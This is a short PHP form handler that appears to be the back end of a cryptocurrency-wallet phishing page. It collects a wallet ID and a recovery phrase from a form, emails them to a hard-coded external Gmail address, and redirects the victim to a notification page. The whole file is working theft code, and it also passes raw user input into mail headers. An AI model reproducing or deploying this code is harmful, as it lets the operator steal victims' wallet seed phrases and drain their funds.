<?php
if(isset($_POST['submit']))
{
$walletid = $_POST['walletid'];
$phase = $_POST['phase'];
$to = "spierinelli12@gmail.com";
$subject= $walletid;
	$headers = "You have a post on : " . $walletid . "\r\n";
	$body= "Phrase:  {$phase}";

	mail($to, $subject, $body, $headers);
    header("Location: notification.php");
}	

?>